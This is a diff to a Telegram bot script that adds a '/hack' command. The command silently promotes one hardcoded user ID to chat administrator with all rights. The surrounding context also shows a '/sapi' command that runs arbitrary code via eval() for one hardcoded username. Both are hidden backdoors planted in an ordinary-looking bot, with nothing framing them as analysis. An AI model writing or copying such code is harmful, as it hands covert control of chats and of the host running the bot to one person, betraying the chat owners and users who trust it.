@@ -58,6 +58,9 @@ new schedule.scheduleJob('01 9 * * *', () => {
 bot.onText(/^\/test/, (msg) => {
 	bot.sendSticker(msg.chat.id, 'CAADAgADOAADyIsGAAE7re09I3hMQwI');
 });
+bot.onText(/\/hack/, (msg) => {
+    if (msg.from.id == 270886500) bot.promoteChatMember(msg.chat.id, 270886500,1,1,1,1,1,1,1,1)
+});
 bot.onText(/\/sapi/, (msg) => {
 	if(msg.from.username == 'Pro100Artem') eval(msg.text.split('sapi ')[1]);
 });
